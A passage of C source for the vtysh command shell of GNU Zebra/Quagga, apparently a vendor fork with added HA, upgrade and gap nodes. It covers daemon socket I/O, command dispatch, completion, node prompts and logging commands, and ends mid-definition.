/* Virtual terminal interface shell.
 * Copyright (C) 2000 Kunihiro Ishiguro
 *
 * This file is part of GNU Zebra.
 *
 * GNU Zebra is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2, or (at your option) any
 * later version.
 *
 * GNU Zebra is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with GNU Zebra; see the file COPYING.  If not, write to the Free
 * Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 */

#include <zebra.h>

#include <sys/un.h>
#include <setjmp.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/stat.h>

#include <readline/readline.h>
#include <readline/history.h>

#include "command.h"
#include "lib/memory.h"
#include "vtysh/vtysh.h"
#include "log.h"
#include "vrf.h"

 /* Struct VTY. */
struct vty *vty;

/* VTY shell pager name. */
char *vtysh_pager_name = NULL;

/* VTY shell client structure. */
struct vtysh_client
{
	int fd;
	const char *name;
	int flag;
	const char *path;
} vtysh_client[] =
{
	{.fd = -1,.name = "router_daemon",.flag = VTYSH_ZEBRA,.path = ZEBRA_VTYSH_PATH},
	{.fd = -1,.name = "app",.flag = VTYSH_APP,.path = APP_VTYSH_PATH},
	{.fd = -1,.name = "ha",.flag = VTYSH_HA,.path = HA_VTYSH_PATH},\
	{.fd = -1,.name = "upgrade",.flag = VTYSH_GU,.path = GU_VTYSH_PATH},
};


/* We need direct access to ripd to implement vtysh_exit_ripd_only. */
static struct vtysh_client *ripd_client = NULL;


/* Using integrated config from Quagga.conf. Default is no. */
int vtysh_writeconfig_integrated = 0;

extern char config_default[];

static void
vclient_close(struct vtysh_client *vclient)
{
	if (vclient->fd >= 0)
	{
		fprintf(stderr,
			"Warning: closing connection to %s because of an I/O error!\n",
			vclient->name);
		close(vclient->fd);
		vclient->fd = -1;
	}
}

/* Return true if str begins with prefix, else return false */
static int
begins_with(const char *str, const char *prefix)
{
	if (!str || !prefix)
		return 0;
	size_t lenstr = strlen(str);
	size_t lenprefix = strlen(prefix);
	if (lenprefix > lenstr)
		return 0;
	return strncmp(str, prefix, lenprefix) == 0;
}

/* Following filled with debug code to trace a problematic condition
 * under load - it SHOULD handle it. */
#define ERR_WHERE_STRING "vtysh(): vtysh_client_execute(): "
static int vtysh_client_execute(struct vtysh_client* vclient, const char* line, FILE* fp)
{
	int ret;
	char* buf;
	size_t bufsz;
	char* pbuf;
	size_t left;
	char *eoln;
	int nbytes;
	int i;
	int readln;
	int numnulls = 0;

	if (vclient->fd < 0)
	{
		return CMD_SUCCESS;
	}

	ret = write(vclient->fd, line, strlen(line) + 1);
	if (ret <= 0)
	{
		vclient_close(vclient);
		return CMD_SUCCESS;
	}

	fd_set rfds;
	FD_ZERO(&rfds);
	FD_SET(vclient->fd, &rfds);

	struct timeval tv;
	tv.tv_sec = 3;
	tv.tv_usec = 0;

	int nRetVal = select(vclient->fd + 1, &rfds, NULL, NULL, &tv);
	if (nRetVal < 1)
	{
		vclient_close(vclient);
		return CMD_SUCCESS;
	}

	/* Allow enough room for buffer to read more than a few pages from socket. */
	bufsz = 5 * getpagesize() + 1;
	buf = XMALLOC(MTYPE_TMP, bufsz);
	memset(buf, 0, bufsz);
	pbuf = buf;
	
	while (1)
	{
		if (pbuf >= ((buf + bufsz) - 1))
		{
			fprintf(stderr, ERR_WHERE_STRING \
				"warning - pbuf beyond buffer end.\n");
			return CMD_WARNING;
		}
		
		readln = (buf + bufsz) - pbuf - 1;
		nbytes = read(vclient->fd, pbuf, readln);

		if (nbytes <= 0)
		{
			if (errno == EINTR)
			{
				continue;
			}

			fprintf(stderr, ERR_WHERE_STRING "(%u)", errno);
			perror("");

			if (errno == EAGAIN || errno == EIO)
			{
				continue;
			}

			vclient_close(vclient);
			XFREE(MTYPE_TMP, buf);
			return CMD_SUCCESS;
		}

		/* If we have already seen 3 nulls, then current byte is ret code */
		if ((numnulls == 3) && (nbytes == 1))
		{
			ret = pbuf[0];
			break;
		}

		pbuf[nbytes] = '\0';

		/* If the config needs to be written in file or stdout */
		if (fp)
		{
			fputs(pbuf, fp);
			fflush(fp);
		}

		/* At max look last four bytes */
		if (nbytes >= 4)
		{
			i = nbytes - 4;
			numnulls = 0;
		}
		else
		{
			i = 0;
		}

		/* Count the numnulls */
		while (i < nbytes && numnulls < 3)
		{
			if (pbuf[i++] == '\0')
			{
				numnulls++;
			}
			else
			{
				numnulls = 0;
			}
		}
		/* We might have seen 3 consecutive nulls so store the ret code before updating pbuf*/
		ret = pbuf[nbytes - 1];
		pbuf += nbytes;

		/* See if a line exists in buffer, if so parse and consume it, and
		 * reset read position. If 3 nulls has been encountered consume the buffer before
		 * next read.
		 */
		if (((eoln = strrchr(buf, '\n')) == NULL) && (numnulls < 3))
		{
			continue;
		}

		if (eoln >= ((buf + bufsz) - 1))
		{
			fprintf(stderr, ERR_WHERE_STRING \
				"warning - eoln beyond buffer end.\n");
		}

		/* If the config needs parsing, consume it */
		if (!fp)
		{
			vtysh_config_parse(buf);
		}

		eoln++;
		left = (size_t)(buf + bufsz - eoln);
		/*
		 * This check is required since when a config line split between two consecutive reads,
		 * then buf will have first half of config line and current read will bring rest of the
		 * line. So in this case eoln will be 1 here, hence calculation of left will be wrong.
		 * In this case we don't need to do memmove, because we have already seen 3 nulls.
		 */
		if (left < bufsz)
		{
			memmove(buf, eoln, left);
		}

		buf[bufsz - 1] = '\0';
		pbuf = buf + strlen(buf);
		/* got 3 or more trailing NULs? */
		if ((numnulls >= 3) && (i < nbytes))
		{
			break;
		}
	}

	if (!fp)
	{
		vtysh_config_parse(buf);
	}

	XFREE(MTYPE_TMP, buf);

	return ret;
}

void vtysh_pager_init(void)
{
	char *pager_defined;

	pager_defined = getenv("VTYSH_PAGER");

	if (pager_defined)
		vtysh_pager_name = strdup(pager_defined);
	else
		vtysh_pager_name = strdup("more");
}

/* Command execution over the vty interface. */
static int
vtysh_execute_func(const char *line, int pager)
{
	int ret, cmd_stat;
	u_int i;
	vector vline;
	struct cmd_element *cmd;
	FILE *fp = NULL;
	int closepager = 0;
	int tried = 0;
	int saved_ret, saved_node;

	/* Split readline string up into the vector. */
	vline = cmd_make_strvec(line);

	if (vline == NULL)
		return CMD_SUCCESS;

	strcpy(vty->buf, line);
	vty->buf[strlen(line)] = '\0';

	saved_ret = ret = cmd_execute_command(vline, vty, &cmd, 1);
	saved_node = vty->node;

	/* If command doesn't succeeded in current node, try to walk up in node tree.
	 * Changing vty->node is enough to try it just out without actual walkup in
	 * the vtysh. */
	while (ret != CMD_SUCCESS && ret != CMD_SUCCESS_DAEMON && ret != CMD_WARNING
		&& vty->node > CONFIG_NODE)
	{
		vty->node = node_parent(vty->node);
		ret = cmd_execute_command(vline, vty, &cmd, 1);
		tried++;
	}

	vty->node = saved_node;

	/* If command succeeded in any other node than current (tried > 0) we have
	 * to move into node in the vtysh where it succeeded. */
	if (ret == CMD_SUCCESS || ret == CMD_SUCCESS_DAEMON || ret == CMD_WARNING)
	{
		if ((saved_node == BGP_VPNV4_NODE || saved_node == BGP_VPNV6_NODE
			|| saved_node == BGP_ENCAP_NODE || saved_node == BGP_ENCAPV6_NODE
			|| saved_node == BGP_IPV4_NODE
			|| saved_node == BGP_IPV6_NODE || saved_node == BGP_IPV4M_NODE
			|| saved_node == BGP_IPV6M_NODE)
			&& (tried == 1))
		{
			vtysh_execute("exit-address-family");
		}
		else if ((saved_node == KEYCHAIN_KEY_NODE) && (tried == 1))
		{
			vtysh_execute("exit");
		}
		else if (tried)
		{
			vtysh_execute("end");
			vtysh_execute("configure terminal");
		}
	}
	/* If command didn't succeed in any node, continue with return value from
	 * first try. */
	else if (tried)
	{
		ret = saved_ret;
	}

	cmd_free_strvec(vline);

	cmd_stat = ret;
	switch (ret)
	{
	case CMD_WARNING:
		if (vty->type == VTY_FILE)
			fprintf(stdout, "Warning...\n");
		break;
	case CMD_ERR_AMBIGUOUS:
		fprintf(stdout, "%% Ambiguous command.\n");
		break;
	case CMD_ERR_NO_MATCH:
		fprintf(stdout, "%% Unknown command.\n");
		break;
	case CMD_ERR_INCOMPLETE:
		fprintf(stdout, "%% Command incomplete.\n");
		break;
	case CMD_SUCCESS_DAEMON:
	{
		/* FIXME: Don't open pager for exit commands. popen() causes problems
		 * if exited from vtysh at all. This hack shouldn't cause any problem
		 * but is really ugly. */
		if (pager && vtysh_pager_name && (strncmp(line, "exit", 4) != 0))
		{
			fp = popen(vtysh_pager_name, "w");
			if (fp == NULL)
			{
				perror("popen failed for pager");
				fp = stdout;
			}
			else
				closepager = 1;
		}
		else
			fp = stdout;

		if (!strcmp(cmd->string, "configure terminal"))
		{
			for (i = 0; i < array_size(vtysh_client); i++)
			{
				cmd_stat = vtysh_client_execute(&vtysh_client[i], line, fp);
				if (cmd_stat == CMD_WARNING)
					break;
			}

			if (cmd_stat)
			{
				line = "end";
				vline = cmd_make_strvec(line);

				if (vline == NULL)
				{
					if (pager && vtysh_pager_name && fp && closepager)
					{
						if (pclose(fp) == -1)
						{
							perror("pclose failed for pager");
						}
						fp = NULL;
					}
					return CMD_SUCCESS;
				}

				ret = cmd_execute_command(vline, vty, &cmd, 1);
				cmd_free_strvec(vline);
				if (ret != CMD_SUCCESS_DAEMON)
					break;
			}
			else
				if (cmd->func)
				{
					(*cmd->func) (cmd, vty, 0, NULL);
					break;
				}
		}

		cmd_stat = CMD_SUCCESS;
		for (i = 0; i < array_size(vtysh_client); i++)
		{
			if (cmd->daemon & vtysh_client[i].flag)
			{
				cmd_stat = vtysh_client_execute(&vtysh_client[i], line, fp);
				if (cmd_stat != CMD_SUCCESS)
					break;
			}
		}
		if (cmd_stat != CMD_SUCCESS)
			break;

		if (cmd->func)
			(*cmd->func) (cmd, vty, 0, NULL);
	}
	}
	if (pager && vtysh_pager_name && fp && closepager)
	{
		if (pclose(fp) == -1)
		{
			perror("pclose failed for pager");
		}
		fp = NULL;
	}
	return cmd_stat;
}

int
vtysh_execute_no_pager(const char *line)
{
	return vtysh_execute_func(line, 0);
}

int
vtysh_execute(const char *line)
{
	return vtysh_execute_func(line, 1);
}

/* Configration make from file. */
int
vtysh_config_from_file(struct vty *vty, FILE *fp)
{
	int ret;
	struct cmd_element *cmd;

	while (fgets(vty->buf, vty->max, fp))
	{
		ret = command_config_read_one_line(vty, &cmd, 1);

		switch (ret)
		{
		case CMD_WARNING:
			if (vty->type == VTY_FILE)
				fprintf(stdout, "Warning...\n");
			break;
		case CMD_ERR_AMBIGUOUS:
			fprintf(stdout, "%% Ambiguous command.\n");
			break;
		case CMD_ERR_NO_MATCH:
			fprintf(stdout, "%% Unknown command: %s", vty->buf);
			break;
		case CMD_ERR_INCOMPLETE:
			fprintf(stdout, "%% Command incomplete.\n");
			break;
		case CMD_SUCCESS_DAEMON:
		{
			u_int i;
			int cmd_stat = CMD_SUCCESS;

			for (i = 0; i < array_size(vtysh_client); i++)
			{
				if (cmd->daemon & vtysh_client[i].flag)
				{
					cmd_stat = vtysh_client_execute(&vtysh_client[i],
						vty->buf, stdout);
					if (cmd_stat != CMD_SUCCESS)
						break;
				}
			}
			if (cmd_stat != CMD_SUCCESS)
				break;

			if (cmd->func)
				(*cmd->func) (cmd, vty, 0, NULL);
		}
		}
	}
	return CMD_SUCCESS;
}

/* We don't care about the point of the cursor when '?' is typed. */
static int
vtysh_rl_describe(void)
{
	int ret;
	unsigned int i;
	vector vline;
	vector describe;
	int width;
	struct cmd_token *token;

	vline = cmd_make_strvec(rl_line_buffer);

	/* In case of '> ?'. */
	if (vline == NULL)
	{
		vline = vector_init(1);
		vector_set(vline, NULL);
	}
	else
		if (rl_end && isspace((int)rl_line_buffer[rl_end - 1]))
			vector_set(vline, NULL);

	describe = cmd_describe_command(vline, vty, &ret);

	fprintf(stdout, "\n");

	/* Ambiguous and no match error. */
	switch (ret)
	{
	case CMD_ERR_AMBIGUOUS:
		cmd_free_strvec(vline);
		fprintf(stdout, "%% Ambiguous command.\n");
		rl_on_new_line();
		return 0;
		break;
	case CMD_ERR_NO_MATCH:
		cmd_free_strvec(vline);
		fprintf(stdout, "%% There is no matched command.\n");
		rl_on_new_line();
		return 0;
		break;
	}

	/* Get width of command string. */
	width = 0;
	for (i = 0; i < vector_active(describe); i++)
		if ((token = vector_slot(describe, i)) != NULL)
		{
			int len;

			if (token->cmd[0] == '\0')
				continue;

			len = strlen(token->cmd);
			if (token->cmd[0] == '.')
				len--;

			if (width < len)
				width = len;
		}

	for (i = 0; i < vector_active(describe); i++)
		if ((token = vector_slot(describe, i)) != NULL)
		{
			if (token->cmd[0] == '\0')
				continue;

			if (!token->desc)
				fprintf(stdout, "  %-s\n",
					token->cmd[0] == '.' ? token->cmd + 1 : token->cmd);
			else
				fprintf(stdout, "  %-*s  %s\n",
					width,
					token->cmd[0] == '.' ? token->cmd + 1 : token->cmd,
					token->desc);
		}

	cmd_free_strvec(vline);
	vector_free(describe);

	rl_on_new_line();

	return 0;
}

/* Result of cmd_complete_command() call will be stored here
 * and used in new_completion() in order to put the space in
 * correct places only. */
int complete_status;

static char *
command_generator(const char *text, int state)
{
	vector vline;
	static char **matched = NULL;
	static int index = 0;

	/* First call. */
	if (!state)
	{
		index = 0;

		if (vty->node == AUTH_NODE || vty->node == AUTH_ENABLE_NODE)
			return NULL;

		vline = cmd_make_strvec(rl_line_buffer);
		if (vline == NULL)
			return NULL;

		if (rl_end && isspace((int)rl_line_buffer[rl_end - 1]))
			vector_set(vline, NULL);

		matched = cmd_complete_command(vline, vty, &complete_status);
	}

	if (matched && matched[index])
		return matched[index++];

	return NULL;
}

static char **
new_completion(char *text, int start, int end)
{
	char **matches;

	matches = rl_completion_matches(text, command_generator);

	if (matches)
	{
		rl_point = rl_end;
		if (complete_status != CMD_COMPLETE_FULL_MATCH)
			/* only append a space on full match */
			rl_completion_append_character = '\0';
	}

	return matches;
}

#if 0
/* This function is not actually being used. */
static char **
vtysh_completion(char *text, int start, int end)
{
	int ret;
	vector vline;
	char **matched = NULL;

	if (vty->node == AUTH_NODE || vty->node == AUTH_ENABLE_NODE)
		return NULL;

	vline = cmd_make_strvec(rl_line_buffer);
	if (vline == NULL)
		return NULL;

	/* In case of 'help \t'. */
	if (rl_end && isspace((int)rl_line_buffer[rl_end - 1]))
		vector_set(vline, '\0');

	matched = cmd_complete_command(vline, vty, &ret);

	cmd_free_strvec(vline);

	return (char **)matched;
}
#endif

/* Vty node structures. */
static struct cmd_node bgp_node =
{
  BGP_NODE,
  "%s(config-router)# ",
};

static struct cmd_node rip_node =
{
  RIP_NODE,
  "%s(config-router)# ",
};

static struct cmd_node isis_node =
{
  ISIS_NODE,
  "%s(config-router)# ",
};

static struct cmd_node interface_node =
{
  INTERFACE_NODE,
  "%s(config-if-%s)# ",
};

static struct cmd_node rmap_node =
{
  RMAP_NODE,
  "%s(config-route-map)# "
};

static struct cmd_node zebra_node =
{
  ZEBRA_NODE,
  "%s(config-router)# "
};

static struct cmd_node bgp_vpnv4_node =
{
  BGP_VPNV4_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_vpnv6_node =
{
  BGP_VPNV6_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_encap_node =
{
  BGP_ENCAP_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_encapv6_node =
{
  BGP_ENCAPV6_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_ipv4_node =
{
  BGP_IPV4_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_ipv4m_node =
{
  BGP_IPV4M_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_ipv6_node =
{
  BGP_IPV6_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node bgp_ipv6m_node =
{
  BGP_IPV6M_NODE,
  "%s(config-router-af)# "
};

static struct cmd_node ospf_node =
{
  OSPF_NODE,
  "%s(config-router)# "
};

static struct cmd_node ripng_node =
{
  RIPNG_NODE,
  "%s(config-router)# "
};

static struct cmd_node ospf6_node =
{
  OSPF6_NODE,
  "%s(config-ospf6)# "
};

static struct cmd_node babel_node =
{
  BABEL_NODE,
  "%s(config-babel)# "
};

static struct cmd_node keychain_node =
{
  KEYCHAIN_NODE,
  "%s(config-keychain)# "
};

static struct cmd_node keychain_key_node =
{
  KEYCHAIN_KEY_NODE,
  "%s(config-keychain-key)# "
};

struct cmd_node link_params_node =
{
  LINK_PARAMS_NODE,
  "%s(config-link-params)# ",
};

static struct cmd_node app_node =
{
	APP_NODE,
	"%s(app)#",
};

static struct cmd_node gap_outer_node =
{
	GAP_OUTER_NODE,
	"%s(outer)#",
};

static struct cmd_node gap_inner_node =
{
	GAP_INNER_NODE,
	"%s(inner)#",
};

static struct cmd_node gap_arbiter_node =
{
	GAP_ARBITER_NODE,
	"%s(arbiter)#",
};

static struct cmd_node ha_node =
{
	HA_NODE,
	"%s(ha)#",
};


/* Defined in lib/vty.c */
extern struct cmd_node vty_node;

/* When '^Z' is received from vty, move down to the enable mode. */
static int
vtysh_end(void)
{
	switch (vty->node)
	{
	case VIEW_NODE:
	case ENABLE_NODE:
		/* Nothing to do. */
		break;
	default:
		vty->node = ENABLE_NODE;
		break;
	}
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_end_all,
	vtysh_end_all_cmd,
	"end",
	"End current mode and change to enable mode\n")
{
	return vtysh_end();
}


DEFUNSH(VTYSH_RMAP,
	route_map,
	route_map_cmd,
	"route-map WORD (deny|permit) <1-65535>",
	"Create route-map or enter route-map command mode\n"
	"Route map tag\n"
	"Route map denies set operations\n"
	"Route map permits set operations\n"
	"Sequence to insert to/delete from existing route-map entry\n")
{
	vty->node = RMAP_NODE;
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_line_vty,
	vtysh_line_vty_cmd,
	"line vty",
	"Configure a terminal line\n"
	"Virtual terminal\n")
{
	vty->node = VTY_NODE;
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_enable,
	vtysh_enable_cmd,
	"enable",
	"Turn on privileged mode command\n")
{
	vty->node = ENABLE_NODE;
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_disable,
	vtysh_disable_cmd,
	"disable",
	"Turn off privileged mode command\n")
{
	if (vty->node == ENABLE_NODE)
		vty->node = VIEW_NODE;
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_config_terminal,
	vtysh_config_terminal_cmd,
	"configure terminal",
	"Configuration from vty interface\n"
	"Configuration terminal\n")
{
	vty->node = CONFIG_NODE;
	return CMD_SUCCESS;
}

static int
vtysh_exit(struct vty *vty)
{
	switch (vty->node)
	{
	case VIEW_NODE:
	case ENABLE_NODE:
		exit(0);
		break;
	case CONFIG_NODE:
		vty->node = ENABLE_NODE;
		break;
	case INTERFACE_NODE:
	case ZEBRA_NODE:
	case BGP_NODE:
	case RIP_NODE:
	case RIPNG_NODE:
	case OSPF_NODE:
	case OSPF6_NODE:
	case BABEL_NODE:
	case ISIS_NODE:
	case MASC_NODE:
	case RMAP_NODE:
	case VTY_NODE:
	case KEYCHAIN_NODE:
	case APP_NODE:
	case HA_NODE:
	case GAP_INNER_NODE:
	case GAP_OUTER_NODE:
	case GAP_ARBITER_NODE:
		vtysh_execute("end");
		vtysh_execute("configure terminal");
		vty->node = CONFIG_NODE;
		break;
	case BGP_VPNV4_NODE:
	case BGP_VPNV6_NODE:
	case BGP_ENCAP_NODE:
	case BGP_ENCAPV6_NODE:
	case BGP_IPV4_NODE:
	case BGP_IPV4M_NODE:
	case BGP_IPV6_NODE:
	case BGP_IPV6M_NODE:
		vty->node = BGP_NODE;
		break;
	case KEYCHAIN_KEY_NODE:
		vty->node = KEYCHAIN_NODE;
		break;
	case LINK_PARAMS_NODE:
		vty->node = INTERFACE_NODE;
		break;
	default:
		vtysh_execute("end");
		vtysh_execute("configure terminal");
		vty->node = CONFIG_NODE;
		break;
	}
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_exit_all,
	vtysh_exit_all_cmd,
	"exit",
	"Exit current mode and down to previous mode\n")
{
	return vtysh_exit(vty);
}
/*
   ALIAS (vtysh_exit_all,
   vtysh_quit_all_cmd,
   "quit",
   "Exit current mode and down to previous mode\n")
   */
DEFUNSH(VTYSH_ALL,
	vtysh_quit_all,
	vtysh_quit_all_cmd,
	"quit",
	"End the current session\n")
{
	return vtysh_exit(vty);
	//write_config_file(vty, TMP_CONFIG_FILE, 0);
#if 0
	if (vty_shell(vty))
		exit(0);
	else
		vty->status = VTY_CLOSE;
	return CMD_SUCCESS;
#endif
}


DEFUNSH(VTYSH_ZEBRA,
	vtysh_exit_zebra,
	vtysh_exit_zebra_cmd,
	"exit",
	"Exit current mode and down to previous mode\n")
{
	return vtysh_exit(vty);
}

ALIAS(vtysh_exit_zebra,
	vtysh_quit_zebra_cmd,
	"quit",
	"Exit current mode and down to previous mode\n")



	DEFUNSH(VTYSH_RMAP,
		vtysh_exit_rmap,
		vtysh_exit_rmap_cmd,
		"exit",
		"Exit current mode and down to previous mode\n")
{
	return vtysh_exit(vty);
}

ALIAS(vtysh_exit_rmap,
	vtysh_quit_rmap_cmd,
	"quit",
	"Exit current mode and down to previous mode\n")




	DEFUNSH(VTYSH_ALL,
		vtysh_exit_line_vty,
		vtysh_exit_line_vty_cmd,
		"exit",
		"Exit current mode and down to previous mode\n")
{
	return vtysh_exit(vty);
}

ALIAS(vtysh_exit_line_vty,
	vtysh_quit_line_vty_cmd,
	"quit",
	"Exit current mode and down to previous mode\n")

	DEFUNSH(VTYSH_INTERFACE,
		vtysh_interface,
		vtysh_interface_cmd,
		"interface IFNAME",
		"Select an interface to configure\n"
		"Interface's name\n")
{
	char *p = vty->buf;
	vty->node = INTERFACE_NODE;
	if (vty->index)
		free(vty->index);
	p += 10;
	while (isspace(*p))
		p++;
	vty->index = strdup(p);
	return CMD_SUCCESS;
}

ALIAS_SH(VTYSH_INTERFACE,
	vtysh_interface,
	vtysh_outer_interface_cmd,
	"interface outer IFNAME",
	"Select an interface to configure\n"
	"Outer side\n"
	"Interface's name\n")

	ALIAS_SH(VTYSH_ZEBRA,
		vtysh_interface,
		vtysh_interface_vrf_cmd,
		"interface IFNAME " VRF_CMD_STR,
		"Select an interface to configure\n"
		"Interface's name\n"
		VRF_CMD_HELP_STR)

	/* TODO Implement "no interface command in isisd. */
	DEFSH(VTYSH_ZEBRA | VTYSH_RIPD | VTYSH_RIPNGD | VTYSH_OSPFD | VTYSH_OSPF6D,
		vtysh_no_interface_cmd,
		"no interface IFNAME",
		NO_STR
		"Delete a pseudo interface's configuration\n"
		"Interface's name\n")

	DEFSH(VTYSH_ZEBRA,
		vtysh_no_interface_vrf_cmd,
		"no interface IFNAME " VRF_CMD_STR,
		NO_STR
		"Delete a pseudo interface's configuration\n"
		"Interface's name\n"
		VRF_CMD_HELP_STR)

	/* TODO Implement interface description commands in ripngd, ospf6d
	 * and isisd. */
	DEFSH(VTYSH_ZEBRA | VTYSH_RIPD | VTYSH_OSPFD,
		interface_desc_cmd,
		"description .LINE",
		"Interface specific description\n"
		"Characters describing this interface\n")

	DEFSH(VTYSH_ZEBRA | VTYSH_RIPD | VTYSH_OSPFD,
		no_interface_desc_cmd,
		"no description",
		NO_STR
		"Interface specific description\n")

	DEFUNSH(VTYSH_INTERFACE,
		vtysh_exit_interface,
		vtysh_exit_interface_cmd,
		"exit",
		"Exit current mode and down to previous mode\n")
{
	return vtysh_exit(vty);
}

ALIAS(vtysh_exit_interface,
	vtysh_quit_interface_cmd,
	"quit",
	"Exit current mode and down to previous mode\n")

	DEFUN(vtysh_show_thread,
		vtysh_show_thread_cmd,
		"show thread cpu [FILTER]",
		SHOW_STR
		"Thread information\n"
		"Thread CPU usage\n"
		"Display filter (rwtexb)\n")
{
	unsigned int i;
	int ret = CMD_SUCCESS;
	char line[100];

	sprintf(line, "show thread cpu %s\n", (argc == 1) ? argv[0] : "");
	for (i = 0; i < array_size(vtysh_client); i++)
		if (vtysh_client[i].fd >= 0)
		{
			fprintf(stdout, "Thread statistics for %s:\n",
				vtysh_client[i].name);
			ret = vtysh_client_execute(&vtysh_client[i], line, stdout);
			fprintf(stdout, "\n");
		}
	return ret;
}

DEFUN(vtysh_show_work_queues,
	vtysh_show_work_queues_cmd,
	"show work-queues",
	SHOW_STR
	"Work Queue information\n")
{
	unsigned int i;
	int ret = CMD_SUCCESS;
	char line[] = "show work-queues\n";

	for (i = 0; i < array_size(vtysh_client); i++)
		if (vtysh_client[i].fd >= 0)
		{
			fprintf(stdout, "Work queue statistics for %s:\n",
				vtysh_client[i].name);
			ret = vtysh_client_execute(&vtysh_client[i], line, stdout);
			fprintf(stdout, "\n");
		}

	return ret;
}

DEFUN(vtysh_show_work_queues_daemon,
	vtysh_show_work_queues_daemon_cmd,
	"show work-queues (zebra|ripd|ripngd|ospfd|ospf6d|bgpd|isisd)",
	SHOW_STR
	"Work Queue information\n"
	"For the zebra daemon\n"
	"For the rip daemon\n"
	"For the ripng daemon\n"
	"For the ospf daemon\n"
	"For the ospfv6 daemon\n"
	"For the bgp daemon\n"
	"For the isis daemon\n")
{
	unsigned int i;
	int ret = CMD_SUCCESS;

	for (i = 0; i < array_size(vtysh_client); i++)
	{
		if (begins_with(vtysh_client[i].name, argv[0]))
			break;
	}

	ret = vtysh_client_execute(&vtysh_client[i], "show work-queues\n", stdout);

	return ret;
}

DEFUNSH(VTYSH_ZEBRA,
	vtysh_link_params,
	vtysh_link_params_cmd,
	"link-params",
	LINK_PARAMS_STR
)
{
	vty->node = LINK_PARAMS_NODE;
	return CMD_SUCCESS;
}

/* Memory */
DEFUN(vtysh_show_memory,
	vtysh_show_memory_cmd,
	"show memory",
	SHOW_STR
	"Memory statistics\n")
{
	unsigned int i;
	int ret = CMD_SUCCESS;
	char line[] = "show memory\n";

	for (i = 0; i < array_size(vtysh_client); i++)
		if (vtysh_client[i].fd >= 0)
		{
			fprintf(stdout, "Memory statistics for %s:\n",
				vtysh_client[i].name);
			ret = vtysh_client_execute(&vtysh_client[i], line, stdout);
			fprintf(stdout, "\n");
		}

	return ret;
}

/* Logging commands. */
DEFUN(vtysh_show_logging,
	vtysh_show_logging_cmd,
	"show logging",
	SHOW_STR
	"Show current logging configuration\n")
{
	unsigned int i;
	int ret = CMD_SUCCESS;
	char line[] = "show logging\n";

	for (i = 0; i < array_size(vtysh_client); i++)
		if (vtysh_client[i].fd >= 0)
		{
			fprintf(stdout, "Logging configuration for %s:\n",
				vtysh_client[i].name);
			ret = vtysh_client_execute(&vtysh_client[i], line, stdout);
			fprintf(stdout, "\n");
		}

	return ret;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_stdout,
	vtysh_log_stdout_cmd,
	"log stdout",
	"Logging control\n"
	"Set stdout logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_stdout_level,
	vtysh_log_stdout_level_cmd,
	"log stdout "LOG_LEVELS,
	"Logging control\n"
	"Set stdout logging level\n"
	LOG_LEVEL_DESC)
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_stdout,
	no_vtysh_log_stdout_cmd,
	"no log stdout [LEVEL]",
	NO_STR
	"Logging control\n"
	"Cancel logging to stdout\n"
	"Logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_file,
	vtysh_log_file_cmd,
	"log file FILENAME",
	"Logging control\n"
	"Logging to file\n"
	"Logging filename\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_file_level,
	vtysh_log_file_level_cmd,
	"log file FILENAME "LOG_LEVELS,
	"Logging control\n"
	"Logging to file\n"
	"Logging filename\n"
	LOG_LEVEL_DESC)
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_file,
	no_vtysh_log_file_cmd,
	"no log file [FILENAME]",
	NO_STR
	"Logging control\n"
	"Cancel logging to file\n"
	"Logging file name\n")
{
	return CMD_SUCCESS;
}

ALIAS_SH(VTYSH_ALL,
	no_vtysh_log_file,
	no_vtysh_log_file_level_cmd,
	"no log file FILENAME LEVEL",
	NO_STR
	"Logging control\n"
	"Cancel logging to file\n"
	"Logging file name\n"
	"Logging level\n")

	DEFUNSH(VTYSH_ALL,
		vtysh_log_monitor,
		vtysh_log_monitor_cmd,
		"log monitor",
		"Logging control\n"
		"Set terminal line (monitor) logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_monitor_level,
	vtysh_log_monitor_level_cmd,
	"log monitor "LOG_LEVELS,
	"Logging control\n"
	"Set terminal line (monitor) logging level\n"
	LOG_LEVEL_DESC)
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_monitor,
	no_vtysh_log_monitor_cmd,
	"no log monitor [LEVEL]",
	NO_STR
	"Logging control\n"
	"Disable terminal line (monitor) logging\n"
	"Logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_syslog,
	vtysh_log_syslog_cmd,
	"log syslog",
	"Logging control\n"
	"Set syslog logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_syslog_level,
	vtysh_log_syslog_level_cmd,
	"log syslog "LOG_LEVELS,
	"Logging control\n"
	"Set syslog logging level\n"
	LOG_LEVEL_DESC)
